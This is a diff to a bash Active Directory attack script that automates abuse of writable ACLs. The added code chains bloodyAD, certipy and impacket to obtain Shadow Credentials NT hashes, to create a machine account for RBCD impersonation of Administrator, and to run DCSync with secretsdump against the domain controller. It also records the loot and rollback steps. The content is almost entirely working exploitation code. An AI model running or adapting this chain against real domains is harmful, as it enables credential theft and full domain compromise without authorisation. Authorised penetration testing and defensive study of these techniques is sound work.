@@ -1046,6 +1046,7 @@ phase_acl() {
     [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → ACL analysis needs LDAP, skipping"; return; }
     have bloodyAD || { warn "bloodyAD unavailable, skipping ACL analysis"; return; }
     local ba; mapfile -t ba < <(bloody_args)
+    local -A ABUSED=()   # object:action already handled, so we fire each once
 
     subsection "Objects the current account can write (bloodyAD get writable)"
     run "bloodyAD ${ba[*]} get writable --detail"
@@ -1067,23 +1068,36 @@ phase_acl() {
             cur_name=$(echo "$cur_dn" | grep -oP '^CN=\K[^,]+')
             cur_class=""
         fi
-        [[ "$line" =~ objectClass.*group ]] && cur_class="group"
-        [[ "$line" =~ objectClass.*user  ]] && cur_class="user"
+        [[ "$line" =~ objectClass.*group ]]    && cur_class="group"
+        [[ "$line" =~ objectClass.*user  ]]    && cur_class="user"
+        [[ "$line" =~ objectClass.*computer ]] && cur_class="computer"
 
-        # WriteSPN over a user → targeted Kerberoast (no membership needed)
-        if echo "$line" | grep -qiE 'servicePrincipalName'; then
-            [[ -n "$cur_name" ]] && _abuse_writespn "$cur_name"
-        fi
-        if echo "$line" | grep -qiE 'GenericAll|WriteMembers|WRITE|GenericWrite|Self'; then
-            [[ -z "$cur_name" ]] && continue
-            if [[ "$cur_class" == "group" ]] || echo "$cur_dn" | grep -qiE 'CN=Users,|group'; then
-                warn "Writable GROUP detected: ${C_BOLD}$cur_name${C_RESET} → can add members"
-                _abuse_group "$cur_name"
-            else
-                warn "Writable object: ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?}) → GenericAll/Write"
-                [[ "$cur_class" == "user" ]] && _abuse_user "$cur_name"
-            fi
-        fi
+        # Only react to rights that ACTUALLY escalate — ignore benign attribute
+        # writes (thumbnailPhoto, pager, …). Each object+action fires once.
+        [[ -z "$cur_name" ]] && continue
+        local ll="${line,,}" act=""
+        if   [[ "$ll" == *keycredentiallink* ]]; then act="shadow"
+        elif [[ "$ll" == *allowedtoactonbehalfofotheridentity* ]]; then act="rbcd"
+        elif [[ "$ll" == *serviceprincipalname* ]]; then act="spn"
+        elif [[ "$ll" == *member:* && ( "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ) ]]; then act="group"
+        elif [[ "$ll" =~ (genericall|owner|fullcontrol|writedacl|allextendedrights) ]]; then act="full"
+        else continue; fi
+
+        local dkey="${cur_name}:${act}"
+        [[ -n "${ABUSED[$dkey]:-}" ]] && continue
+        ABUSED["$dkey"]=1
+
+        case "$act" in
+            shadow) warn "Writable msDS-KeyCredentialLink on ${C_BOLD}$cur_name${C_RESET} → Shadow Credentials"; _abuse_shadowcred "$cur_name" ;;
+            rbcd)   warn "Writable RBCD attr on ${C_BOLD}$cur_name${C_RESET} → Resource-Based Delegation"; _abuse_rbcd "$cur_name" ;;
+            spn)    _abuse_writespn "$cur_name" ;;
+            group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$cur_name" ;;
+            full)
+                warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
+                if [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$cur_name"
+                elif [[ "$cur_class" == "computer" || "$cur_name" == *\$ ]]; then _abuse_rbcd "$cur_name" || _abuse_shadowcred "$cur_name"
+                else _abuse_shadowcred "$cur_name" || _abuse_user "$cur_name"; fi ;;
+        esac
     done <<<"$w"
 }
 
@@ -1119,6 +1133,71 @@ _abuse_user() {
     else
         warn "Failed to reset '$target' password"
     fi
+}
+
+# Shadow Credentials (msDS-KeyCredentialLink) → recover target's NT hash via PKINIT.
+# Non-destructive (certipy 'auto' adds the key, authenticates, then removes it).
+# Returns 0 if it recovered a hash.
+_abuse_shadowcred() {
+    local target="$1"
+    have certipy || return 1
+    [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try Shadow Credentials on '$target')"; return 1; }
+    confirm "  Shadow Credentials on '${target}' (non-destructive, recovers its hash)?" || return 1
+    local cargs=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP")
+    if   [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then cargs+=(-k -no-pass)
+    elif [[ -n "$HASH" ]]; then cargs+=(-hashes ":$HASH")
+    else cargs+=(-p "$PASS"); fi
+    run "certipy shadow auto ${cargs[*]}"
+    local out; out=$(certipy shadow auto "${cargs[@]}" 2>&1); echo "$out" | tee -a "$LOGFILE"
+    local nt; nt=$(echo "$out" | grep -oiP "Got hash for .*:\s*\K\S+" | awk -F: '{print $NF}' | head -1)
+    if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
+        loot "★ Shadow Credentials → NT hash of ${C_BOLD}$target${C_RESET}: ${C_MAGENTA}$nt${C_RESET}"
+        note_cred_source "$target" "Shadow Credentials (msDS-KeyCredentialLink)"
+        queue_cred "$target" "" "$nt"
+        return 0
+    fi
+    warn "Shadow Credentials did not yield a hash for $target"; return 1
+}
+
+# Resource-Based Constrained Delegation: write msDS-AllowedToActOnBehalfOf… on a
+# computer we control, then impersonate Administrator to it.
+_abuse_rbcd() {
+    local target="$1"   # computer object we can write (e.g. DC$)
+    [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try RBCD on '$target')"; return 1; }
+    have impacket-getST || return 1
+    confirm "  RBCD on '${target}' (creates a machine account if MachineAccountQuota>0)?" || return 1
+    local ba; mapfile -t ba < <(bloody_args)
+    local comp="adpwn\$" cpass="ADAutoPwn_RBCD_123!"
+    run "impacket-addcomputer (adpwn\$) via $USER"
+    local addargs=("$DOMAIN/$USER" -dc-ip "$DC_IP" -computer-name 'adpwn$' -computer-pass "$cpass")
+    [[ -n "$HASH" ]] && addargs+=(-hashes ":$HASH"); [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]] && addargs+=(-k -no-pass)
+    if [[ -n "$PASS" && -z "$HASH" && -z "$KERB_TICKET" ]]; then
+        impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1 | tee -a "$LOGFILE"
+    else
+        impacket-addcomputer "${addargs[@]}" 2>&1 | tee -a "$LOGFILE"
+    fi
+    rb_record "Created machine account adpwn\$" "bloodyAD ${ba[*]} remove dnsRecord 2>/dev/null; impacket-addcomputer '$DOMAIN/$USER' -dc-ip '$DC_IP' -computer-name 'adpwn\$' -delete"
+    run "bloodyAD add rbcd '$target' 'adpwn\$'"
+    bloodyAD "${ba[@]}" add rbcd "$target" 'adpwn$' 2>&1 | tee -a "$LOGFILE"
+    rb_record "Set RBCD on $target → adpwn\$" "bloodyAD ${ba[*]} remove rbcd '$target' 'adpwn\$'"
+    local svc="cifs/${target%\$}.${DOMAIN}"
+    run "impacket-getST -spn $svc -impersonate Administrator $DOMAIN/adpwn\$"
+    rm -f "Administrator@${svc/\//_}@${DOMAIN^^}.ccache" "Administrator.ccache" 2>/dev/null
+    impacket-getST -spn "$svc" -impersonate Administrator "$DOMAIN/adpwn\$:$cpass" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE"
+    local st; st=$(ls -t *.ccache 2>/dev/null | head -1)
+    if [[ -n "$st" ]]; then
+        mv -f "$st" "$OUTDIR/rbcd_admin.ccache" 2>/dev/null
+        loot "★ RBCD → Administrator service ticket for $target → rbcd_admin.ccache"
+        note_cred_source "Administrator@$target" "RBCD impersonation"
+        # If the target is the DC, that ticket is enough to DCSync
+        if [[ "${target%\$}" == "$DC_HOST" ]]; then
+            subsection "RBCD ticket targets the DC → secretsdump"
+            KRB5CCNAME="$OUTDIR/rbcd_admin.ccache" impacket-secretsdump -k -no-pass "${DC_FQDN}" -just-dc \
+                -outputfile "$OUTDIR/dcsync_rbcd" 2>&1 | tee -a "$LOGFILE" | tee -a "$OUTDIR/secretsdump.txt"
+        fi
+        return 0
+    fi
+    warn "RBCD did not produce a ticket for $target"; return 1
 }
 
 # Targeted Kerberoast via WriteSPN: set a temp SPN, roast, then remove it
@@ -1669,9 +1748,9 @@ ${C_CYAN}${C_BOLD}OPTIONS${C_RESET}
   ${C_DIM}── toggles (no value) ──${C_RESET}
   ${C_GREEN}--no-crack${C_RESET}     Disable hash cracking ${C_DIM}(cracking is ON by default)${C_RESET}
   ${C_GREEN}--spray${C_RESET}        Also spray the domain-focused wordlist ONLINE ${C_YELLOW}(account-lockout risk)${C_RESET}
-  ${C_GREEN}--abuse${C_RESET}        ${C_BOLD}Actively exploit${C_RESET} ACLs (group adds, password resets, WriteSPN
-                roast, set owner). Off by default → ACLs only reported. Tracked
-                for rollback (see --cleanup)
+  ${C_GREEN}--abuse${C_RESET}        ${C_BOLD}Actively exploit${C_RESET} ACLs: group adds, ForceChangePassword,
+                WriteSPN→Kerberoast, ${C_BOLD}Shadow Credentials${C_RESET}, ${C_BOLD}RBCD${C_RESET}, restore/enable
+                accounts. Off by default → ACLs only reported. Rollback-tracked
   ${C_GREEN}--cleanup${C_RESET}      Revert every change this tool recorded, then exit. Point ${C_GREEN}-o${C_RESET} at the
                 original loot dir so it can read its rollback.log
   ${C_GREEN}--stealth${C_RESET}      OPSEC mode: skip noisy techniques (enum4linux, etc.) + add jitter
